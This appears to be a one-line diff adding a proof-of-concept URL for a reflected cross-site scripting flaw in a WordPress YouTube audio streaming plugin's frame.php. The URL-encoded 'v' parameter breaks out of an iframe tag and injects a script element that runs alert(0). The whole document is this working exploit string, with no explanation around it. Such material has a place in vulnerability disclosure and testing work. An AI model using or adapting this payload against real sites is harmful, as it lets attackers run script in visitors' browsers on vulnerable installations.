@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/yt-audio-streaming-audio-from-youtube/frame.php?v=%22%3E%3C/iframe%3E%3Cscript%3Ealert(0)%3C%2fscript%3E%3Ciframe+src=%22
